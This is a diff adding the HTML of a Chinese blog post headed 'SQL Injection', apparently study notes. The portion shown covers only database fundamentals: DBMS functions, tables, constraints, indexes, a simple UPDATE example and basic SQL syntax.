@@ -1,0 +1,1272 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 8.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/sign.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/small.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hnu-legend1440.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="第四章 SQL 注入[Week4.1]数据库基础与 SQL 基本语法数据库基础参考文章 https:&#x2F;&#x2F;blog.csdn.net&#x2F;senxu_&#x2F;article&#x2F;details&#x2F;126877128 数据库管理系统(Database Management System)是一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库，简称 DBMS。 它对数据库进行统一的管">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第四章-SQL注入">
+<meta property="og:url" content="http://hnu-legend1440.com/2025/11/11/%E7%AC%AC%E5%9B%9B%E7%AB%A0-SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="拂云观 · legend1440">
+<meta property="og:description" content="第四章 SQL 注入[Week4.1]数据库基础与 SQL 基本语法数据库基础参考文章 https:&#x2F;&#x2F;blog.csdn.net&#x2F;senxu_&#x2F;article&#x2F;details&#x2F;126877128 数据库管理系统(Database Management System)是一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库，简称 DBMS。 它对数据库进行统一的管">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hnu-legend1440.com/images/X32VbWpTdopoqBxh8WEcv2k9nmf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Qt85brpF2oeKbdxjo4WcFAW9n4N.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/DGHpbtvLGoDprTxK2gqcF7t4nKb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/D2PYbxfExoZ6iQxtGwncImPtnOf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/DUZibdAo7oE0vuxv7MycAR58nwb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/XxuebGLIuoXkYDxmXuccv7kgn57.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/ZearbzMB2oR0h5xgoTGc70ZPncd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/XUyibqmrdojcIOxObOdcylPKn7b.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/M9anbtKV3o4s1YxEIV5cG9IBnHe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/HV1abjyhYoi37ixxUcccLqC5nqn.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/APiXbwAe6oohRcxmztmcwbkYn4W.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/AKJKbG3ypos6K4xan3rcm6z0nmG.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/SzGZbDPi4oj0OIxLjsncp0ovnld.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/ZLJjb9TtPo5ksAxKjtlcKf1Unkg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/HhQRbKyL8o5HaDxmAE3cC33nnKd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/S2qybJcijoaLfNxBKhLcJ2g1nsg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/L8meb4D39oBiXMx7bp8cFrLanNc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/ObedbqB8hoqRoqxQZ6lcqCEJnOh.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Bk24bH0bZof4iIxQreUc8UnPniA.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/LLlVbjCCXomHFsxlfS7cVjcvnPb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/HR1wbYDQTozhCpxXAOwcVOS7nVd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/PNxMbXs3JoH5Bbx072sctFC4nDb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/DYScbC3PWoxuFKxRX3Jc8og7nwf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/XuaQbDkbWoiaQJxtn5rcPS0dnhg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/OFLxb3NBTopeBQxWMkochN1RnTf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Q5qKbpvEno7JJBxpWpOczStbnZB.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/ALUTbkdx7oSgiax6sLRcrPIrnZ9.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Rengbs1VuoUCSNx6XIScG56cn7c.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Gz7obxLOtoYpQuxRDZqculI7nlh.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/L1C7brwt7og0hvx2iONcEafhnTe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/SV66bukrooQ4kRx48nCc8SQNnnf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/NYFfb3iLBoSwymxpxh2ccAw9ngg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/ObkPbMfcNoUsv7xxayOcrp1Vncg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/UvYibKrKyoISMDxn4bmcZamenNl.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/QzpnbmqFVoydvCx7g83cb674nLh.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Z12dbQlnSopfHNxyCvJcZZoGnwe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/CSG8bWY5BoZvFGxcfGpcHjjDn0d.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/TlqsbZY0fovpUXx6n1dcd4u6nOb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/BWnhbQGUTo170Sx0sqlcfXFInih.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Ah5obP8FboEN1gxJYjqcECA1nXg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/DUNobyPIsotJ8pxXikjcNZI2nih.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/OTpXbM1wpox6QJx3KGecoRLMncs.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/WKcNbUPpSoknObxjB86cvxSknJ4.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/M71ubjkWxoCU0RxTCRFcXwjHnwh.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/ILAab6Zv3oG7UJxHQXkcoQHrnoc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/JtAlboiWtoGLAfxKOxscVl4sn6e.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Qs0HbLdfvoxqWrxo0Zicexswnjh.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Uv88bBu6Qoj2iExOkEJcc5C8nac.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/JCtIbl2B3oiiYcxaKlZcFqm9ny6.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/EAW6bxNYao7RDqxU0rFc4pZzngP.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/KbcIb5H5IolDoZxfX8YcX4XVnPe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/WKBPbbvkLoU8jAxxKL9c3ughnMh.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/GT1qb0Ezao08UhxCG4Dcy2a2nlc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Mn3tbj4sLoXEYUxKovhcMF1pnne.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/UoAebgwuloZiXyxOngsczQ29nJc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/NLslbPwUwo90U9xdE5Qc7GFsnwg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/FxNpbvFcKoTmmexqZOmcZVI3nbg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/U4q8bGc46oQJGyx6T15cLPs3nqc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/MsXbbl6mboN6LBxwtqocVWZQnKh.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/SzKRbXsKGo7ukexfjLMcsyLKnvf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/EFO7bVeD6oXfxmx8iy9chlWjn3e.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/BA4eb0AxZoIVRzx1lUhcgvT4n60.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/ZzKUbEdQco1G9BxikIIcuTL5nt5.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/GtafbGzkVob8AyxSx1ScGRxrnze.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/UKoGbnIycouyeNxMPqGchSV7n9g.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/OOVgbajvfopg6txY0DDc7UdvnCd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/NOzRbPc9JoszlqxzhNIcFPUunpC.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/VouXbgQ5noRixFxSXxocTpbTnwb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Kl7RbNp2OoQFGAxqtrWc8o3Hnch.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/KkLvbdykgoM68KxpZcWcnGdfnBc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/FI0XbfqLdoCUR4xtCNYcNKYonZf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/JxrLblc7ro8rZDxNKYKctOV4n4g.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/LxwvbUwHnonsVixg4crc3WRunHe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/U4LSbiQWDod89yxIdVfcZfEinrg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/UUovbjXA0okIfSxGqrvcOX5pnrf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/XMWcbhBVjojRjgxK6qQcx09mn7e.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/YfAdb3J8YoEE01xXdmQcHKRhn3d.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/HVRgbkdRYo15JLxs67wcdQYnnyd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/IuFcbQMmVoSOkuxq2DFcjtkOn6H.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/T0iQbxRDUo5KkZx4d8mcP1YNnhd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/KHnubCYyZoMLaSxbLOVcQB2XnRe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/NmFibyQutoypA2x34nEcqr3UnId.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/PoKkbogq6oQYWMxFDmjc8j8fnXf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/EMOUbWApeoNq7rxOea4cw36qnSg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/FvPfbQxfOomHNdxZzscc4Zh7nQb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/AGBtbookSofXbdxvPKecVQf9nAp.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/GyV4bKc9SofVQ1xVW8XcpNnZnXb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/TTiEbBQlSoTi14x6G4bcLOEMnpe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/ND7Mbrt2Ao1rMaxWGTRcidoQnAc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Mv20bYqFIoT27YxXhDdcqpHgnud.png">
+<meta property="article:published_time" content="2025-11-11T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-01-20T17:14:28.550Z">
+<meta property="article:author" content="legend1440">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hnu-legend1440.com/images/X32VbWpTdopoqBxh8WEcv2k9nmf.png">
+
+<link rel="canonical" href="http://hnu-legend1440.com/2025/11/11/%E7%AC%AC%E5%9B%9B%E7%AB%A0-SQL%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>第四章-SQL注入 | 拂云观 · legend1440</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">拂云观 · legend1440</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/categories/schedule/" rel="section"><i class="fa fa-skating fa-fw"></i>期末突击</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-chess fa-fw"></i>往世乐土</a>
+
+  </li>
+        <li class="menu-item menu-item-training">
+
+    <a href="/categories/training/" rel="section"><i class="fa fa-yin-yang fa-fw"></i>集训修行</a>
+
+  </li>
+        <li class="menu-item menu-item-wp">
+
+    <a href="/categories/WP/" rel="section"><i class="fa fa-feather fa-fw"></i>全面战场</a>
+
+  </li>
+        <li class="menu-item menu-item-puzzles">
+
+    <a href="/categories/puzzles/" rel="section"><i class="fa fa-spa fa-fw"></i>练习札记</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2025/11/11/%E7%AC%AC%E5%9B%9B%E7%AB%A0-SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="legend1440">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="拂云观 · legend1440">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          第四章-SQL注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-11-11 12:00:00" itemprop="dateCreated datePublished" datetime="2025-11-11T12:00:00+08:00">2025-11-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-01-21 01:14:28" itemprop="dateModified" datetime="2026-01-21T01:14:28+08:00">2026-01-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="第四章-SQL-注入"><a href="#第四章-SQL-注入" class="headerlink" title="第四章 SQL 注入"></a>第四章 SQL 注入</h1><h1 id="Week4-1-数据库基础与-SQL-基本语法"><a href="#Week4-1-数据库基础与-SQL-基本语法" class="headerlink" title="[Week4.1]数据库基础与 SQL 基本语法"></a>[Week4.1]数据库基础与 SQL 基本语法</h1><h2 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h2><p>参考文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/senxu_/article/details/126877128">https://blog.csdn.net/senxu_&#x2F;article&#x2F;details&#x2F;126877128</a></p>
+<p><strong>数据库管理系统</strong>(Database Management System)是一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库，简称 DBMS。</p>
+<p>它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性。用户通过 DBMS 访问数据库中的数据，数据库管理员也通过 DBMS 进行数据库的维护工作。</p>
+<p>它可以支持多个应用程序和用户用不同的方法在同时或不同时刻去建立，修改和询问数据库。大部分 DBMS 提供<strong>数据定义语言 DDL</strong> 和<strong>数据操作语言 DML</strong>，供用户定义数据库的模式结构与权限约束，实现对数据的追加、删除等操作。</p>
+<p>其又是由<strong>许多程序所组成</strong>的一个大型软件系统，每个程序都有自己的功能，共同完成 DBMS 的一个或几个工作。</p>
+<h3 id="DBMS-的组成程序"><a href="#DBMS-的组成程序" class="headerlink" title="DBMS 的组成程序"></a>DBMS 的组成程序</h3><p><strong>（1）语言编译处理程序</strong></p>
+<p>包含数据定义语言 DDL 编译程序和数据操作语言 DML 编译程序.</p>
+<p><strong>数据定义语言 DDL 编译程序</strong>把用 DDL 编写的各级源模式编译成各级目标模式。这些目标模式是对数据库结构信息的描述，它们被保存在数据字典中，供以后数据操纵或数据控制时使用。</p>
+<p><strong>数据操作语言 DML 编译程序</strong>将应用程序中的 DML 语句转换成可执行程序，实现对数据库的检索、插入、删除和修改等基本操作。</p>
+<p><strong>（2）系统运行控制程序</strong></p>
+<p><strong>（3）系统建立、维护程序</strong></p>
+<p><strong>（4）数据字典</strong></p>
+<h3 id="DBMS-的功能"><a href="#DBMS-的功能" class="headerlink" title="DBMS 的功能"></a>DBMS 的功能</h3><p><strong>（1）数据定义功能</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DBMS提供数据定义语言（Data Define Language，DDL），定义数据的模式、外模式和内模式三级模式结构，定义模式/内模式和外模式/模式二级映像，定义有关的约束条件。例如，为保证数据库安全而定义用户口令和存取权限，为保证正确语义而定义完整性规则等。再如,DBMS提供的结构化查询语言（SQL）提供Create、Drop、Alter等语句可分别用来建立、删除和修改数据库。</span><br><span class="line"></span><br><span class="line">用DDL定义的各种模式需要通过相应的模式翻译程序转换为机器内部代码表示形式，保存在数据字典（Data Dictionary，DD）（或称为系统目录）中。数据字典是DBMS存取数据的基本依据。因此，DBMS中应包括DDL的编译程序。</span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）数据操纵功能</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DBMS提供数据操纵语言（Data Manipulation Language，DML）实现对数据库的基本操作，包括检索、更新（包括插入、修改和删除）等。因此，在DBMS中也应包括DML的编译程序或解释程序。</span><br><span class="line"></span><br><span class="line">DML有两类：一类是自主型的或自含型的，这一类属于交互式命令语言，语法简单可独立使用；另一类是宿主型的，&lt;u&gt;它把对数据库的存取语句嵌入在高级语言&lt;/u&gt;（如Fortran、Pascal、C等）中，不能单独使用。**SQL就是数据操纵语言的一种。**例如,DBMS提供的结构化查询语言SQL提供查询语句（Select）、插入语句（Insert）、修改语句（Update）和删除语句（Delete），可分别实现对数据库中数据记录的查询、插入、修改和删除等操作。</span><br></pre></td></tr></table></figure>
+
+<p><strong>（3）数据库运行管理功能</strong></p>
+<p><strong>（4）数据库的建立和维护功能</strong></p>
+<p><strong>（5）数据组织、存储、管理</strong></p>
+<p><strong>（6）数据通信功能</strong></p>
+<h3 id="DBMS-的特点"><a href="#DBMS-的特点" class="headerlink" title="DBMS 的特点"></a>DBMS 的特点</h3><p><strong>（1）数据结构化且统一管理</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有DBMS统一管理。优点是数据易维护，易扩展，数据冗余明显减少，真正实现了数据的共享。</span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）有较高的数据独立性</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据库的独立性包括数据的物理独立性和数据的逻辑独立性。</span><br></pre></td></tr></table></figure>
+
+<p><strong>（3）数据库控制功能</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">包括对数据库中数据的安全性、完整性、并发和恢复的控制。</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h2><p>一个数据库表（Table）是关系型数据库（如 MySQL、Oracle、SQL Server 等）中存储数据的<strong>核心结构化对象</strong>，本质是由「行（记录）」和「列（字段）」组成的二维表格，同时包含约束、元数据等辅助信息以保证数据的完整性和规范性。</p>
+<p>假设你要做一个「班级学生登记表」，这个表就是数据库里的 “表”：</p>
+<h3 id="列（字段）-表格的-“表头”"><a href="#列（字段）-表格的-“表头”" class="headerlink" title="列（字段）&#x3D; 表格的 “表头”"></a>列（字段）&#x3D; 表格的 “表头”</h3><p>就像 Excel 里第一行的 “姓名、学号、性别、生日、成绩”，数据库表的 “列” 就是给数据定规矩的：</p>
+<ul>
+<li>每一列有个明确的 “名字”（比如 “学号”“成绩”），不能重复；</li>
+<li>每一列有固定 “格式”（比如 “学号” 只能是数字、“生日” 只能是日期、“成绩” 是 0-100 的数字）；</li>
+<li>还能加 “小规则”（比如 “学号不能重复”“姓名必须填”“成绩不能是负数”）。</li>
+</ul>
+<h3 id="行（记录）-表格里的-“每一行数据”"><a href="#行（记录）-表格里的-“每一行数据”" class="headerlink" title="行（记录）&#x3D; 表格里的 “每一行数据”"></a>行（记录）&#x3D; 表格里的 “每一行数据”</h3><p>Excel 里除了表头，每一行都对应一个学生的信息，数据库表的 “行” 就是具体的 “实体数据”：</p>
+<ul>
+<li>一行对应一个完整的对象（比如 “张三” 这个人的所有信息）；</li>
+<li>每一行的 “学号” 是唯一的（就像身份证），不会有两个学生学号一样；</li>
+<li>行越多，说明存的实体越多（比如班里 50 个学生，就有 50 行）。</li>
+</ul>
+<h3 id="约束-给表格定的-“规矩”"><a href="#约束-给表格定的-“规矩”" class="headerlink" title="约束 &#x3D; 给表格定的 “规矩”"></a>约束 &#x3D; 给表格定的 “规矩”</h3><p>比如你在登记表里要求 “学号不能重复”“必须填姓名”“成绩不能超 100”，这些就是数据库表的 “约束”：</p>
+<ul>
+<li>保证数据不乱（不会出现 “学号重复”“没填姓名”“成绩 150 分” 这种离谱情况）；</li>
+<li>就像生活中 “身份证号唯一”“上班必须打卡” 的规矩，防止出错。</li>
+</ul>
+<h3 id="索引-表格的-“目录”"><a href="#索引-表格的-“目录”" class="headerlink" title="索引 &#x3D; 表格的 “目录”"></a>索引 &#x3D; 表格的 “目录”</h3><p>如果班里有 1000 个学生，想快速找到 “学号 2024001 的学生”，总不能一行行翻吧？数据库的 “索引” 就像书的目录，提前记下 “学号 2024001 在第 3 行”，不用全表找，直接定位，查得更快。</p>
+<h3 id="元数据-表格的-“备注”"><a href="#元数据-表格的-“备注”" class="headerlink" title="元数据 &#x3D; 表格的 “备注”"></a>元数据 &#x3D; 表格的 “备注”</h3><p>就像你在 Excel 表名旁边写 “2024 级 3 班学生表”，或者在表头备注 “成绩满分 100”，数据库的 “元数据” 就是记录这个表的基本信息：</p>
+<ul>
+<li>表叫什么名字、用来存什么（比如 “学生表” 存学生信息）；</li>
+<li>每一列的格式、规矩是什么（比如 “生日是日期格式”）；</li>
+<li>这个表是哪天建的、用了什么格式存储（比如 UTF-8 能存中文）。</li>
+</ul>
+<h3 id="数据的一般要求"><a href="#数据的一般要求" class="headerlink" title="数据的一般要求"></a>数据的一般要求</h3><p><strong>关键信息不能重（实体完整性：UNIQUE&#x2F;PRIMARY KEY）</strong></p>
+<p>就像身份证号、学号不能和别人重复 —— 表中 “唯一标识” 类的列，值必须独一无二，用来区分不同行（不同对象）。</p>
+<ul>
+<li>要求：用 <code>PRIMARY KEY</code>（主键，非空 + 唯一，比如学号、用户 ID）或 <code>UNIQUE</code>（唯一约束，比如手机号、邮箱）；</li>
+<li>例子：学生表的 “学号” 不能重复（一个学号对应一个学生）；订单表的 “订单号” 不能重复（一个订单号对应一个订单）；</li>
+<li>反面教材：两个学生学号都是 “2024001”，查 “学号 2024001 的成绩” 会出来两行，根本分不清是谁的。</li>
+</ul>
+<p><strong>数据格式不能错（域完整性：数据类型 + CHECK）</strong></p>
+<p>就像 “年龄” 只能填数字、“生日” 只能填日期 —— 每列的数据必须符合预设的 “格式规矩”，不能乱填。</p>
+<ul>
+<li>要求：列指定明确数据类型（INT &#x2F; 日期 &#x2F; VARCHAR 等），必要时加 <code>CHECK</code> 约束；</li>
+<li>例子：“年龄” 列是 INT 类型，不能填 “二十”“99.5”“abc”；“成绩” 列加 <code>CHECK (成绩 BETWEEN 0 AND 100)</code>，不能填 150 分；“手机号” 是 CHAR (11)，不能填 10 位或 12 位；</li>
+<li>反面教材：“生日” 列填 “2024-30-50”（日期不存在）、“成绩” 列填 “优秀”（不是数字），数据库没法识别，后续统计、查询全失效。</li>
+</ul>
+<h3 id="数据的选定"><a href="#数据的选定" class="headerlink" title="数据的选定"></a>数据的选定</h3><p><strong>列是 “直接指定”，行是 “靠列的条件间接筛选”</strong></p>
+<p>在下面的函数中,用 column1,2,3 选定列，而行通常用 WHERE 条件选定</p>
+<p>例如:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 学生表</span><br><span class="line"><span class="keyword">SET</span> 成绩 <span class="operator">=</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">WHERE</span> 年级 <span class="operator">=</span> <span class="number">2024</span> <span class="keyword">AND</span> 成绩 <span class="operator">&lt;</span> <span class="number">80</span>;  <span class="comment">-- 多条件组合选行</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="SQL-基本语法"><a href="#SQL-基本语法" class="headerlink" title="SQL 基本语法"></a>SQL 基本语法</h2><h3 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h3><p>SQL（Structured Query Language）是一种用于<strong>管理和操作关系数据库</strong>的标准语言，包括数据查询、数据插入、数据更新、数据删除、数据库结构创建和修改等功能。<strong>需要在数据库上执行的大部分工作都由 SQL 语句完成。</strong></p>
+<p><img src="/images/X32VbWpTdopoqBxh8WEcv2k9nmf.png"></p>
+<p>注意:SQL 对大小写不敏感：SELECT 与 select 是相同的。</p>
+<p>某些数据库系统要求在每条 SQL 语句的末端使用<strong>分号</strong>。</p>
+<p><strong>分号</strong>是在数据库系统中分隔每条 SQL 语句的标准方法，这样就可以在对服务器的相同请求中执行一条以上的 SQL 语句。</p>
